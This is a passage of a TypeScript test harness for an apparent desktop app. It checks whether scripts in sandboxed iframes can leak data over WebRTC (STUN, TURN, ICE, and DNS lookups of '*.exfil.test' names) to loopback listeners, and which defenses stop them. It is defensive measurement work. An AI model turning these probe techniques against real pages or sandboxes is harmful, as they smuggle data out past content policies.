// webrtc-frame-spike: can a frame that runs scripts be kept from reaching the
// network over WebRTC? A loopback harness, in the spirit of 0033's
// `pnpm sketch-frames`, that reaches nothing but 127.0.0.1.
//
//   node scripts/webrtc-frames.ts            headless Chrome (playwright-core)
//   node scripts/webrtc-frames.ts --desktop  the app's own Electron, hidden
//
// Each run puts one probe in one kind of frame, under one set of levers, and
// gives it its own listeners:
// - stun: a UDP socket. Any datagram is a leak.
// - turn-udp, turn-tcp: a TURN server's first step. It answers an Allocate
//   with no credentials "401, realm r, nonce n", so the client sends it again
//   with the USERNAME the script chose.
// - turn-tls: a TCP listener for `turns:`. It never finishes TLS; it sees
//   the connection and the ClientHello.
// - peer-udp, peer-tcp: ICE straight to a "peer". The script makes up the
//   peer's answer, with an ICE ufrag it chooses, and the peer's address as a
//   candidate; the connectivity check carries "<ufrag>:<local ufrag>".
// A cell reads `LEAK` when the script's chosen bytes (its USERNAME or ufrag)
// reached the listener, `reach` when packets or a connection did without
// them (still a channel: which port, and when, carry bits), `proxy` when the
// only trace is a CONNECT to the refusing proxy, and `·` when nothing came.
//
// Frame kinds, each sandboxed with `allow-scripts` only, in a host page with
// Oriel's own kind of CSP:
// - sandboxed: an <iframe src> from another site (localhost vs 127.0.0.1);
// - srcdoc: 0033's shape with scripts on, an outer sandboxed document from
//   the other site holding an <iframe srcdoc> with the app;
// - data: an <iframe src="data:…">;
// - blob: a blob: URL the host makes from the app's HTML;
// - partition (Electron only): the app as a top-level document in a
//   WebContentsView in a session of its own, with CSP `sandbox allow-scripts`.
// Variants, how the script gets RTCPeerConnection:
// - direct: its own global;
// - child-blank: from an about:blank <iframe> it appends, synchronously;
// - child-srcdoc: in an <iframe srcdoc> it builds, whose script runs the probe.
//
// Levers: csp (`webrtc 'block'` in every policy), policy
// (webContents.setWebRTCIPHandlingPolicy('disable_non_proxied_udp'), or
// Chrome's --force-webrtc-ip-handling-policy switch), preload (a preload in
// every frame that deletes RTCPeerConnection; in Chrome, an init script),
// proxy (every request through a proxy that passes only the host's and the
// app's own origins and refuses everything else, CONNECT included), and
// command-line switches. It reads the clock, so it is a script, not a test.
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import dgram from "node:dgram";
import {
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import http from "node:http";
import net from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createInterface } from "node:readline";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";

const { values } = parseArgs({
  options: {
    desktop: { type: "boolean", default: false },
    settle: { type: "string", default: "3000" },
    only: { type: "string" },
    app: { type: "string" },
  },
});
const settle = Number(values.settle);
const root = fileURLToPath(new URL("../", import.meta.url));

const listen = (server: http.Server | net.Server) =>
  new Promise<number>((resolve) =>
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      resolve(typeof address === "object" && address ? address.port : 0);
    }),
  );

// ---- STUN/TURN messages, just enough to draw the USERNAME out ----

const cookie = 0x2112a442;
type Stun = { type: number; tx: Buffer; attrs: Map<number, Buffer> };
function parseStun(buf: Buffer): Stun | null {
  if (buf.length < 20 || buf.readUInt32BE(4) !== cookie) return null;
  const length = buf.readUInt16BE(2);
  if (buf.length < 20 + length) return null;
  const attrs = new Map<number, Buffer>();
  for (let at = 20; at + 4 <= 20 + length;) {
    const t = buf.readUInt16BE(at);
    const l = buf.readUInt16BE(at + 2);
    attrs.set(t, buf.subarray(at + 4, at + 4 + l));
    at += 4 + Math.ceil(l / 4) * 4;
  }
  return { type: buf.readUInt16BE(0), tx: buf.subarray(8, 20), attrs };
}
function stunMessage(type: number, tx: Buffer, attrs: [number, Buffer][]): Buffer {
  const body = Buffer.concat(
    attrs.map(([t, v]) => {
      const head = Buffer.alloc(4);
      head.writeUInt16BE(t, 0);
      head.writeUInt16BE(v.length, 2);
      return Buffer.concat([head, v, Buffer.alloc((4 - (v.length % 4)) % 4)]);
    }),
  );
  const head = Buffer.alloc(20);
  head.writeUInt16BE(type, 0);
  head.writeUInt16BE(body.length, 2);
  head.writeUInt32BE(cookie, 4);
  tx.copy(head, 8);
  return Buffer.concat([head, body]);
}
// An Allocate (0x0003) without USERNAME (0x0006) gets 401 with REALM and NONCE.
function turnReply(message: Stun): Buffer | null {
  if (message.type !== 0x0003 || message.attrs.has(0x0006)) return null;
  const code = Buffer.concat([Buffer.from([0, 0, 4, 1]), Buffer.from("Unauthorized")]);
  return stunMessage(0x0113, message.tx, [
    [0x0009, code],
    [0x0014, Buffer.from("r")],
    [0x0015, Buffer.from("n0nce")],
  ]);
}
// A Binding request (0x0001) gets a success with no attributes; enough to
// keep a check going, and harmless if it isn't.
function bindingReply(message: Stun): Buffer | null {
  return message.type === 0x0001 ? stunMessage(0x0101, message.tx, []) : null;
}

// ---- One run's listeners ----

const channels = [
  "stun",
  "turn-udp",
  "turn-tcp",
  "turn-tls",
  "peer-udp",
  "peer-tcp",
  // The same, by name: the lookup of a name the script chose is a channel of
  // its own (to whoever answers for the name), seen in the engine's net log.
  "stun-dns",
  "turn-dns",
  "ice-dns",
  "ice-tcp-dns",
] as const;
type Channel = (typeof channels)[number];
type Heard = { packets: number; bytes: string };
type Trap = { ports: Record<Channel, number>; heard: Record<Channel, Heard>; close(): void };

async function trap(): Promise<Trap> {
  const heard = Object.fromEntries(channels.map((c) => [c, { packets: 0, bytes: "" }])) as Record<
    Channel,
    Heard
  >;
  const closers: (() => void)[] = [];
  const udp = async (channel: Channel, answer: (m: Stun) => Buffer | null) => {
    const socket = dgram.createSocket("udp4");
    socket.on("message", (buf, from) => {
      heard[channel].packets += 1;
      heard[channel].bytes += buf.toString("latin1");
      const message = parseStun(buf);
      const reply = message && answer(message);
      if (reply) socket.send(reply, from.port, from.address);
    });
    await new Promise<void>((resolve) => socket.bind(0, "127.0.0.1", resolve));
    closers.push(() => socket.close());
    return socket.address().port;
  };
  const tcp = async (channel: Channel, answer: ((m: Stun) => Buffer | null) | null) => {
    const sockets = new Set<net.Socket>();
    const server = net.createServer((socket) => {
      sockets.add(socket);
      socket.on("error", () => {});
      heard[channel].packets += 1;
      let buffered = Buffer.alloc(0);
      socket.on("data", (chunk) => {
        heard[channel].bytes += chunk.toString("latin1");
        if (!answer) return;
        buffered = Buffer.concat([buffered, chunk]);
        // TURN over TCP: STUN messages back to back. ICE-TCP (RFC 4571):
        // each behind a 2-byte length.
        for (;;) {
          const framed = buffered.length >= 2 && buffered.length >= 2 + buffered.readUInt16BE(0);
          const direct = parseStun(buffered);
          const message = direct ?? (framed ? parseStun(buffered.subarray(2)) : null);
          if (!message) break;
          const size =
            20 + (direct ? buffered.readUInt16BE(2) : buffered.readUInt16BE(4)) + (direct ? 0 : 2);
          buffered = buffered.subarray(size);
          const reply = answer(message);
          if (reply && direct) socket.write(reply);
          if (reply && !direct) {
            const length = Buffer.alloc(2);
            length.writeUInt16BE(reply.length);
            socket.write(Buffer.concat([length, reply]));
          }
        }
      });
    });
    const port = await listen(server);
    closers.push(() => {
      for (const socket of sockets) socket.destroy();
      server.close();
    });
    return port;
  };
  const ports: Record<Channel, number> = {
    stun: await udp("stun", bindingReply),
    "turn-udp": await udp("turn-udp", turnReply),
    "turn-tcp": await tcp("turn-tcp", turnReply),
    "turn-tls": await tcp("turn-tls", null),
    "peer-udp": await udp("peer-udp", bindingReply),
    "peer-tcp": await tcp("peer-tcp", bindingReply),
    "stun-dns": await udp("stun-dns", bindingReply),
    "turn-dns": await tcp("turn-dns", turnReply),
    "ice-dns": await udp("ice-dns", bindingReply),
    "ice-tcp-dns": await tcp("ice-tcp-dns", bindingReply),
  };
  return { ports, heard, close: () => closers.forEach((close) => close()) };
}

// ---- The refusing proxy ----
// Passes plain requests to the host's and the app's own servers, and refuses
// everything else: any other target, and every CONNECT.

const refused: string[] = [];
const allowedPorts = new Set<number>();
const proxy = http.createServer((req, res) => {
  let target: URL;
  try {
    target = new URL(req.url ?? "");
  } catch {
    refused.push(`${req.method} ${req.url}`);
    return void res.writeHead(403).end();
  }
  const local = target.hostname === "127.0.0.1" || target.hostname === "localhost";
  if (!local || !allowedPorts.has(Number(target.port))) {
    refused.push(`${req.method} ${target.host}`);
    return void res.writeHead(403).end();
  }
  const upstream = http.request(
    {
      host: "127.0.0.1",
      port: target.port,
      path: target.pathname + target.search,
      method: req.method,
      headers: req.headers,
    },
    (reply) => {
      res.writeHead(reply.statusCode ?? 502, reply.headers);
      reply.pipe(res);
    },
  );
  upstream.on("error", () => res.writeHead(502).end());
  req.pipe(upstream);
});
proxy.on("connect", (req, socket) => {
  refused.push(`CONNECT ${req.url}`);
  socket.on("error", () => {});
  socket.end("HTTP/1.1 403 Forbidden\r\n\r\n");
});
const proxyPort = await listen(proxy);

// ---- The probe, as the app's script ----
// Plain ES5-ish source, stringified into each document. It never writes the
// closing script tag literally, so it can go into a srcdoc.

function probe(win: any, c: any, say: (o: any) => void) {
  let PC: any;
  try {
    PC = win.RTCPeerConnection || win.webkitRTCPeerConnection;
  } catch (e: any) {
    say({ ch: "api", err: String(e && e.message) });
    return;
  }
  say({ ch: "api", ok: typeof PC === "function" });
  if (typeof PC !== "function") return;
  const P = c.ports;
  const M = c.mark;
  const answer = (sdp: string, ufrag: string) =>
    sdp
      .replace(/a=ice-ufrag:.*/g, "a=ice-ufrag:" + ufrag)
      .replace(/a=ice-pwd:.*/g, "a=ice-pwd:abcdefghijklmnopqrstuvwx")
      .replace(/a=setup:actpass/g, "a=setup:active");
  const go = (ch: string, config: any, peer?: { ufrag: string; cand: string }) => {
    try {
      const pc = new PC(config);
      (win.__pcs = win.__pcs || []).push(pc);
      pc.createDataChannel("x");
      pc.createOffer()
        .then((o: any) => pc.setLocalDescription(o))
        .then(() => {
          if (!peer) return;
          return pc
            .setRemoteDescription({
              type: "answer",
              sdp: answer(pc.localDescription.sdp, peer.ufrag),
            })
            .then(() => pc.addIceCandidate({ candidate: peer.cand, sdpMid: "0" }));
        })
        .then(
          () => say({ ch, ok: true }),
          (e: any) => say({ ch, err: String((e && e.message) || e) }),
        );
    } catch (e: any) {
      say({ ch, err: String((e && e.message) || e) });
    }
  };
  const turn = (url: string, user: string) => ({
    iceTransportPolicy: "relay",
    iceServers: [{ urls: url, username: M + user, credential: "pw" }],
  });
  go("stun", { iceServers: [{ urls: "stun:127.0.0.1:" + P["stun"] }] });
  go("turn-udp", turn("turn:127.0.0.1:" + P["turn-udp"] + "?transport=udp", "tu"));
  go("turn-tcp", turn("turn:127.0.0.1:" + P["turn-tcp"] + "?transport=tcp", "tt"));
  go("turn-tls", turn("turns:127.0.0.1:" + P["turn-tls"] + "?transport=tcp", "ts"));
  go(
    "peer-udp",
    {},
    {
      ufrag: M + "pu",
      cand: "candidate:1 1 udp 2122260223 127.0.0.1 " + P["peer-udp"] + " typ host",
    },
  );
  go(
    "peer-tcp",
    {},
    {
      ufrag: M + "pt",
      cand: "candidate:2 1 tcp 1518280447 127.0.0.1 " + P["peer-tcp"] + " typ host tcptype passive",
    },
  );
  const named = (sub: string) => M + sub + ".exfil.test";
  go("stun-dns", { iceServers: [{ urls: "stun:" + named("sd") + ":" + P["stun-dns"] }] });
  go("turn-dns", turn("turn:" + named("td") + ":" + P["turn-dns"] + "?transport=tcp", "tn"));
  go(
    "ice-dns",
    {},
    {
      ufrag: M + "pn",
      cand: "candidate:3 1 udp 2122260223 " + named("id") + " " + P["ice-dns"] + " typ host",
    },
  );
  go(
    "ice-tcp-dns",
    {},
    {
      ufrag: M + "pm",
      cand:
        "candidate:4 1 tcp 1518280447 " +
        named("ic") +
        " " +
        P["ice-tcp-dns"] +
        " typ host tcptype passive",
    },
  );
}

function main(c: any) {
  const say = (o: any) => {
    o.mark = c.mark;
    o.where = c.nested ? "child-srcdoc" : "frame";
    if (top === self) ((self as any).__reports = (self as any).__reports || []).push(o);
    else
      try {
        top!.postMessage({ probe: o }, "*");
      } catch {}
  };
  // A top-level app (the partition kind) collects its nested frame's reports.
  if (!c.nested && top === self)
    addEventListener("message", (e) => {
      if (e.data && e.data.probe)
        ((self as any).__reports = (self as any).__reports || []).push(e.data.probe);
    });
  if (!c.nested) {
    fetch(c.own).then(
      (r) => r.text().then((t) => say({ ch: "own-fetch", ok: t === "own" })),
      (e) => say({ ch: "own-fetch", err: String(e) }),
    );
    if (top !== self) {
      addEventListener("message", (e) => {
        if (e.data && e.data.bridged === c.mark)
          say({ ch: "bridge", ok: e.data.body === "bridged" });
      });
      top!.postMessage({ bridge: c.mark }, "*");
    }
  }
  if (c.variant === "direct" || c.nested) probe(window, c, say);
  else if (c.variant === "child-blank") {
    const f = document.createElement("iframe");
    document.body.appendChild(f);
    probe(f.contentWindow, c, say);
  } else if (c.variant === "child-srcdoc") {
    const g = document.createElement("iframe");
    const child = JSON.stringify(Object.assign({}, c, { nested: true }));
    const tag = "scr" + "ipt";
    g.srcdoc = "<" + tag + ">var C=" + child + ";" + c.src + ";main(C)</" + tag + ">";
    document.body.appendChild(g);
  }
}

// The functions as the browser sees them: type annotations erased by Node's
// strip-types leave plain JavaScript in Function#toString.
const probeSource = `${probe.toString()};${main.toString()}`;
if (/<\/script/i.test(probeSource)) throw new Error("the probe source closes a script tag");

// ---- Runs, and the servers that serve them ----

const kinds = ["sandboxed", "srcdoc", "data", "blob", "partition"] as const;
type Kind = (typeof kinds)[number];
const variants = ["direct", "child-blank", "child-srcdoc"] as const;
type Variant = (typeof variants)[number];
type Levers = {
  csp?: boolean;
  policy?: boolean;
  preload?: boolean;
  proxy?: boolean;
  deadproxy?: boolean;
};
type Run = {
  id: number;
  kind: Kind;
  variant: Variant;
  levers: Levers;
  ports: Record<Channel, number>;
  mark: string;
};
const runs = new Map<number, Run>();

let hostPort = 0;
let appPort = 0;
const appOrigin = () => `http://localhost:${appPort}`;
const appPolicy = (run: Run, top = false) =>
  [
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    `connect-src ${appOrigin()}`,
    ...(run.levers.csp ? ["webrtc 'block'"] : []),
    ...(top ? ["sandbox allow-scripts"] : []),
  ].join("; ");
const appHtml = (run: Run, meta: boolean) => {
  const config = {
    mark: run.mark,
    variant: run.variant,
    ports: run.ports,
    own: `${appOrigin()}/own`,
    src: probeSource,
  };
  const policy = meta
    ? `<meta http-equiv="Content-Security-Policy" content="${appPolicy(run)}">`
    : "";
  return `<!doctype html><meta charset="utf-8">${policy}<body><p>app ${run.mark}</p><script>var C=${JSON.stringify(config)};${probeSource};main(C)</script>`;
};
const attr = (text: string) => text.replaceAll("&", "&amp;").replaceAll('"', "&quot;");
const runOf = (url: URL) => runs.get(Number(url.searchParams.get("run")));

const hostScript = `window.reports = [];
window.features = document.featurePolicy ? document.featurePolicy.features() : null;
addEventListener("message", function (e) {
  var d = e.data;
  if (d && d.probe) window.reports.push(d.probe);
  if (d && d.bridge) fetch("/bridge").then(function (r) { return r.text(); }).then(function (t) {
    e.source.postMessage({ bridged: d.bridge, body: t }, "*");
  });
});
if (document.body.dataset.blob) {
  var run = new URLSearchParams(location.search).get("run");
  fetch("/apphtml?run=" + run).then(function (r) { return r.text(); }).then(function (t) {
    var f = document.createElement("iframe");
    f.setAttribute("sandbox", "allow-scripts");
    f.src = URL.createObjectURL(new Blob([t], { type: "text/html" }));
    document.body.appendChild(f);
  });
}`;

const host = http.createServer((req, res) => {
  const url = new URL(req.url ?? "/", "http://x");
  if (url.pathname === "/host.js") {
    res.writeHead(200, { "content-type": "text/javascript" });
    return void res.end(hostScript);
  }
  if (url.pathname === "/bridge") {
    res.writeHead(200, { "content-type": "text/plain" });
    return void res.end("bridged");
  }
  const run = runOf(url);
  if (!run) return void res.writeHead(404).end();
  if (url.pathname === "/apphtml") {
    res.writeHead(200, { "content-type": "text/plain" });
    return void res.end(appHtml(run, true));
  }
  const blob = run.kind === "blob";
  const local = blob || run.kind === "data";
  // Oriel's page's own kind of policy (site.ts), framing the app's origin. A
  // blob: or data: document takes its creator's policy (measured: a data:
  // frame's inline script is refused under the host's script-src 'self'), so
  // for those the host must allow inline script and the app's connect-src.
  const policy = [
    "default-src 'none'",
    `script-src 'self'${local ? " 'unsafe-inline'" : ""}`,
    `connect-src 'self'${local ? ` ${appOrigin()}` : ""}`,
    `frame-src ${appOrigin()} data: blob:`,
    "base-uri 'none'",
    ...(run.levers.csp ? ["webrtc 'block'"] : []),
  ].join("; ");
  const frame =
    run.kind === "sandboxed"
      ? `<iframe sandbox="allow-scripts" src="${appOrigin()}/app?run=${run.id}"></iframe>`
      : run.kind === "srcdoc"
        ? `<iframe sandbox="allow-scripts" src="${appOrigin()}/outer?run=${run.id}"></iframe>`
        : run.kind === "data"
          ? `<iframe sandbox="allow-scripts" src="data:text/html;base64,${Buffer.from(appHtml(run, true)).toString("base64")}"></iframe>`
          : "";
  res.writeHead(200, {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": policy,
  });
  res.end(
    `<!doctype html><meta charset="utf-8"><body${blob ? ' data-blob="1"' : ""}><p>host ${run.mark}</p><script src="/host.js"></script>${frame}`,
  );
});

const appServer = http.createServer((req, res) => {
  const url = new URL(req.url ?? "/", "http://x");
  if (url.pathname === "/own") {
    res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
    return void res.end("own");
  }
  const run = runOf(url);
  if (!run) return void res.writeHead(404).end();
  const top = url.searchParams.has("top");
  res.writeHead(200, {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": appPolicy(run, top),
  });
  if (url.pathname === "/app") return void res.end(appHtml(run, false));
  // 0033's outer document: no script of its own, one sandboxed srcdoc frame,
  // which takes this document's policy.
  if (url.pathname === "/outer")
    return void res.end(
      `<!doctype html><meta charset="utf-8"><iframe sandbox="allow-scripts" srcdoc="${attr(appHtml(run, false))}"></iframe>`,
    );
  res.writeHead(404).end();
});
hostPort = await listen(host);
appPort = await listen(appServer);
allowedPorts.add(hostPort);
allowedPorts.add(appPort);

// ---- Engines ----

type Outcome = { reports: any[]; permissions: string[]; features?: string[] | null };
type Engine = {
  name: string;
  load(run: Run): Promise<Outcome>;
  close(): Promise<void>;
};
const commonSwitches = [
  // Host candidates as names would mean multicast DNS on the LAN; off, so
  // nothing leaves loopback. It changes no outbound path.
  "--disable-features=WebRtcHideLocalIpsWithMdns",
  "--use-mock-keychain",
  // No name resolves but loopback's, so the engine's own background traffic
  // (updates, accounts) can't leave the Mac either. The probes use literal
  // 127.0.0.1 addresses, which no rule touches.
  // *.exfil.test, the probes' own names, answer 127.0.0.1 from the rules
  // (WebRTC's lookups go through the network context's resolver, which the
  // rules wrap: services/network/p2p/socket_manager.cc, network_context.cc).
  "--host-resolver-rules=MAP *.exfil.test 127.0.0.1, MAP * ~NOTFOUND, EXCLUDE localhost, EXCLUDE 127.0.0.1",
  "--disable-background-networking",
  "--disable-component-update",
  // The engine's log is the DNS detector: the network service logs each name
  // WebRTC hands its resolver (services/network/p2p/socket_manager.cc), and
  // the rules above fail every probe name in the form it asks for (with a
  // trailing dot), so each lookup is logged, and none leaves the Mac.
  "--enable-logging=stderr",
  "--v=0",
  "--vmodule=*p2p_transport_channel*=1,*turn_port*=1,*stun_port*=1",
];

// Probe names the engine's resolver was asked for, and the lookups WebRTC
// started (renderer side), from the engines' stderr.
const resolved = new Set<string>();
const started = new Set<string>();
function scan(text: string) {
  for (const line of text.split("\n")) {
    const asked = /Failed to resolve address for (q\d+z[a-z]{2}\.exfil\.test)/.exec(line)?.[1];
    if (asked) resolved.add(asked);
    const begun =
      /(?:host lookup for|resolving ICE candidate hostname) (q\d+z[a-z]{2}\.exfil\.test)/.exec(line)?.[1];
    if (begun) started.add(begun);
  }
}
// Chrome's stderr reaches this process only as Playwright's `pw:browser`
// debug lines, so turn those on before Playwright loads, scan them, and keep
// them off the terminal.
process.env["DEBUG"] = "pw:browser";
const write = process.stderr.write.bind(process.stderr);
process.stderr.write = ((chunk: string | Uint8Array, ...rest: any[]) => {
  const text = String(chunk);
  if (text.includes("pw:browser")) {
    scan(text);
    return true;
  }
  return write(chunk, ...rest);
}) as typeof process.stderr.write;
const { chromium } = await import("playwright-core");

// Current Chrome has no WebRTC policy switch (--force-webrtc-ip-handling-
// policy is gone); it reads the policy only from the profile's pref
// `webrtc.ip_handling_policy`, which extensions and enterprise policy set. So
// a policy run gets a fresh profile with that pref in its Preferences.
async function chrome(switches: string[], proxied: boolean, policyPref: boolean): Promise<Engine> {
  const args = () => [
    ...commonSwitches,
    ...switches,
    ...(proxied
      ? [`--proxy-server=http://127.0.0.1:${proxyPort}`, "--proxy-bypass-list=<-loopback>"]
      : []),
  ];
  const options = () => ({
    channel: "chrome",
    headless: true,
    chromiumSandbox: true,
    args: args(),
  });
  const browser = policyPref ? null : await chromium.launch(options());
  let version = browser?.version() ?? "";
  const open = async () => {
    if (browser) return browser.newContext();
    const profile = mkdtempSync(join(tmpdir(), "oriel-webrtc-profile-"));
    mkdirSync(join(profile, "Default"));
    writeFileSync(
      join(profile, "Default/Preferences"),
      JSON.stringify({ webrtc: { ip_handling_policy: "disable_non_proxied_udp" } }),
    );
    const context = await chromium.launchPersistentContext(profile, options());
    version = context.browser()?.version() ?? version;
    return context;
  };
  if (!browser) await (await open()).close();
  return {
    get name() {
      return `Chrome ${version} headless${policyPref ? ", pref webrtc.ip_handling_policy = disable_non_proxied_udp" : ""}`;
    },
    async load(run) {
      const context = await open();
      if (run.levers.preload)
        await context.addInitScript(
          `for (const n of ["RTCPeerConnection", "webkitRTCPeerConnection"]) { try { delete globalThis[n]; } catch {} }`,
        );
      const page = await context.newPage();
      if (process.env["DEBUG"]) page.on("console", (m) => console.log("console:", m.text()));
      await page.goto(`http://127.0.0.1:${hostPort}/host?run=${run.id}`).catch(() => {});
      await page.waitForTimeout(settle);
      const reports = (await page.evaluate("window.reports").catch(() => [])) as any[];
      const features = (await page.evaluate("window.features").catch(() => null)) as
        | string[]
        | null;
      await context.close();
      return { reports, permissions: [], features };
    },
    close: async () => {
      await browser?.close();
    },
  };
}

const sha256 = (path: string) => createHash("sha256").update(readFileSync(path)).digest("hex");
const framework = "Contents/Frameworks/Electron Framework.framework/Electron Framework";

async function electron(
  out: string,
  switches: string[],
  rules?: { line: string; appended: string },
): Promise<Engine> {
  // The app's own Electron, fuses set, from a built Oriel.app: `--app`, or
  // this worktree's build, or the main checkout's (read only, copied).
  const built =
    values.app ??
    [
      join(root, "packages/desktop/build/darwin-arm64/Oriel.app"),
      "/Users/Vibdev/code/oriel/packages/desktop/build/darwin-arm64/Oriel.app",
    ].find((path) => existsSync(path));
  if (!built) throw new Error("no built Oriel.app; run pnpm desktop:try once, or pass --app");
  const app = join(out, `Oriel-${switches.length}-${Math.random().toString(36).slice(2, 8)}.app`);
  execFileSync("ditto", [built, app]);
  const code = join(app, "Contents/Resources/app");
  rmSync(code, { recursive: true });
  execFileSync(
    "pnpm",
    ["exec", "tsc", "-p", "packages/desktop/probe-webrtc", "--noEmit", "false", "--outDir", code],
    { cwd: root, stdio: "inherit" },
  );
  cpSync(
    join(root, "packages/desktop/probe-webrtc/preload.cjs"),
    join(code, "probe-webrtc/preload.cjs"),
  );
  writeFileSync(
    join(code, "package.json"),
    JSON.stringify({
      name: "oriel-webrtc-probe",
      private: true,
      type: "module",
      main: "probe-webrtc/main.js",
    }),
  );
  execFileSync("codesign", ["--force", "--sign", "-", app]);
  if (sha256(join(app, framework)) !== sha256(join(built, framework)))
    throw new Error("the probe build's Electron isn't the app's");
  const data = join(out, `probe-data-${Math.random().toString(36).slice(2, 8)}`);
  mkdirSync(data);
  const child = spawn(
    join(app, "Contents/MacOS/Oriel"),
    [
      ...commonSwitches.map((arg) =>
        rules && arg.startsWith("--host-resolver-rules=") ? `--host-resolver-rules=${rules.line}` : arg,
      ),
      ...switches,
      "--probe-data",
      data,
      ...(rules ? ["--probe-append-rules", rules.appended] : []),
    ],
    {
      stdio: ["pipe", "pipe", "pipe"],
    },
  );
  child.stderr.setEncoding("utf8");
  child.stderr.on("data", (chunk: string) => scan(chunk));
  const exited = new Promise<void>((resolve) => child.on("exit", () => resolve()));
  const waiting = new Map<number, (outcome: Outcome) => void>();
  let ready: (v: { electron: string; chrome: string }) => void;
  const versions = new Promise<{ electron: string; chrome: string }>(
    (resolve) => (ready = resolve),
  );
  createInterface({ input: child.stdout }).on("line", (line) => {
    let message: any;
    try {
      message = JSON.parse(line);
    } catch {
      return;
    }
    if (message.ready) ready({ electron: message.electron, chrome: message.chrome });
    if (message.done !== undefined)
      waiting.get(message.done)?.({
        reports: [...message.host, ...message.view],
        permissions: message.permissions,
      });
  });
  const { electron: version, chrome: engine } = await Promise.race([
    versions,
    exited.then(() => {
      throw new Error("the probe build quit before it was ready");
    }),
  ]);
  return {
    name: `Electron ${version} (Chromium ${engine}), the app's framework ${sha256(join(app, framework)).slice(0, 12)}…${switches.length ? `, switches ${switches.join(" ")}` : ""}`,
    load(run) {
      return new Promise<Outcome>((resolve) => {
        waiting.set(run.id, resolve);
        child.stdin.write(
          `${JSON.stringify({
            run: run.id,
            host: `http://127.0.0.1:${hostPort}/host?run=${run.id}`,
            ...(run.kind === "partition" ? { view: `${appOrigin()}/app?run=${run.id}&top=1` } : {}),
            ...(run.levers.policy ? { policy: "disable_non_proxied_udp" } : {}),
            ...(run.levers.preload ? { preload: true } : {}),
            ...(run.levers.proxy ? { proxy: proxyPort } : {}),
            ...(run.levers.deadproxy
              ? { deadProxy: `127.0.0.1:${hostPort},localhost:${appPort}` }
              : {}),
            settle,
          })}\n`,
        );
      });
    },
    async close() {
      child.stdin.end();
      const timer = setTimeout(() => child.kill("SIGKILL"), 10_000);
      await exited;
      clearTimeout(timer);
    },
  };
}

// ---- The matrix ----

type Cell = string;
type Row = {
  engine: string;
  config: string;
  kind: Kind;
  variant: Variant;
  api: string;
  cells: Record<Channel, Cell>;
  own: string;
  bridge: string;
  errors: string[];
  permissions: string[];
};
const rows: Row[] = [];
let nextId = 1;

const userOf: Record<Channel, string> = {
  stun: "",
  "turn-udp": "tu",
  "turn-tcp": "tt",
  "turn-tls": "ts",
  "peer-udp": "pu",
  "peer-tcp": "pt",
  "stun-dns": "",
  "turn-dns": "tn",
  "ice-dns": "pn",
  "ice-tcp-dns": "pm",
};
// The probes' names resolve to 127.0.0.1 by the engine's rules. WebRTC's
// lookups leave nothing in the net log, so a lookup shows as where the
// connection went: straight to the listener, or to the proxy as CONNECT
// 127.0.0.1:port (looked up here first: a DNS leak outside the harness), not
// CONNECT <name>:port (the name handed to the proxy, no lookup here).
const named = new Set<Channel>(["stun-dns", "turn-dns", "ice-dns", "ice-tcp-dns"]);
const nameOf: Partial<Record<Channel, string>> = {
  "stun-dns": "sd",
  "turn-dns": "td",
  "ice-dns": "id",
  "ice-tcp-dns": "ic",
};

async function measure(
  engine: Engine,
  config: string,
  levers: Levers,
  kind: Kind,
  variant: Variant,
) {
  const listeners = await trap();
  const id = nextId++;
  const run: Run = { id, kind, variant, levers, ports: listeners.ports, mark: `q${id}z` };
  runs.set(id, run);
  const before = refused.length;
  const outcome = await engine.load(run);
  await new Promise((resolve) => setTimeout(resolve, 200));
  listeners.close();
  const asked = refused.slice(before);
  const cells = Object.fromEntries(
    channels.map((channel) => {
      const heard = listeners.heard[channel];
      const port = listeners.ports[channel];
      const chosen = userOf[channel] && heard.bytes.includes(run.mark + userOf[channel]);
      const cell: Cell = chosen
        ? "LEAK"
        : heard.packets
          ? "reach"
          : asked.some((line) => line.endsWith(`:${port}`))
            ? named.has(channel) &&
              asked.some((line) => line.endsWith(`127.0.0.1:${port}`))
              ? "DNS→proxy"
              : "proxy"
            : "·";
      // A lookup the resolver was asked for is a DNS leak on its own.
      const name = `${run.mark}${nameOf[channel] ?? "--"}.exfil.test`;
      const looked = resolved.has(name);
      return [channel, looked ? (cell === "·" ? "DNS" : `DNS+${cell}`) : cell];
    }),
  ) as Record<Channel, Cell>;
  const reports = (outcome.reports ?? []).filter((r: any) => r && r.mark === run.mark);
  const api = reports
    .filter((r: any) => r.ch === "api")
    .map((r: any) => (r.ok ? "yes" : (r.err ?? "gone")));
  const pick = (ch: string) => {
    const r = reports.find((x: any) => x.ch === ch);
    return r ? (r.ok ? "ok" : `fail${r.err ? `: ${r.err}` : ""}`) : "none";
  };
  const errors = reports
    .filter((r: any) => r.err && r.ch !== "own-fetch" && r.ch !== "bridge")
    .map((r: any) => `${r.ch}: ${r.err}`);
  const row: Row = {
    engine: engine.name,
    config,
    kind,
    variant,
    api: api.length ? api.join("/") : "no report",
    cells,
    own: pick("own-fetch"),
    bridge: kind === "partition" ? "n/a" : pick("bridge"),
    errors: [...new Set(errors)],
    permissions: outcome.permissions,
  };
  rows.push(row);
  if (outcome.features && !featuresSeen) featuresSeen = outcome.features;
  console.log(
    `${config.padEnd(24)} ${kind.padEnd(10)} ${variant.padEnd(12)} api=${row.api.padEnd(4)} ${channels.map((c) => `${c}=${cells[c]}`).join(" ")} own=${row.own} bridge=${row.bridge}${row.errors.length ? ` errors=${JSON.stringify(row.errors)}` : ""}${row.permissions.length ? ` asked=${row.permissions.join(",")}` : ""}`,
  );
}
let featuresSeen: string[] | null = null;

const out = realpathSync(mkdtempSync(join(tmpdir(), "oriel-webrtc-frames-")));
const only = values.only ? new RegExp(values.only) : null;

type Plan = {
  config: string;
  switches: string[];
  proxied?: boolean;
  policyPref?: boolean;
  rules?: { line: string; appended: string };
  levers: Levers[];
  kinds: readonly Kind[];
  variants: readonly Variant[];
};
const label = (l: Levers) =>
  [l.csp && "csp", l.policy && "policy", l.preload && "preload", l.proxy && "proxy", l.deadproxy && "deadproxy"]
    .filter(Boolean)
